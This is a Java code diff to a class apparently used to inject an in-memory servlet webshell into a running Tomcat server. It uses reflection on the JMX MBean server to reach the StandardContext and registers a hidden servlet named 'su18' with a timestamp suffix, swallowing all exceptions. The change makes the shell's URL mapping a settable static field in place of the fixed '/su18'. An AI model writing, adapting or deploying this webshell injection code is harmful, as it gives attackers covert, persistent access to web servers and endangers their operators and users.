@@ -21,10 +21,11 @@ import javax.management.ObjectName;
  */
 public class TSMSFromJMX implements Servlet {
 
+	public static String pattern;
+
 	static {
 		try {
 			String servletName = "su18" + System.nanoTime();
-			String urlPattern  = "/su18";
 
 			MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
 			Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
@@ -58,7 +59,7 @@ public class TSMSFromJMX implements Servlet {
 					wrapper.setServletClass(servlet.getClass().getName());
 					wrapper.setServlet(servlet);
 					ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
-					registration.addMapping(urlPattern);
+					registration.addMapping(pattern);
 				}
 			}
 		} catch (Exception ignored) {
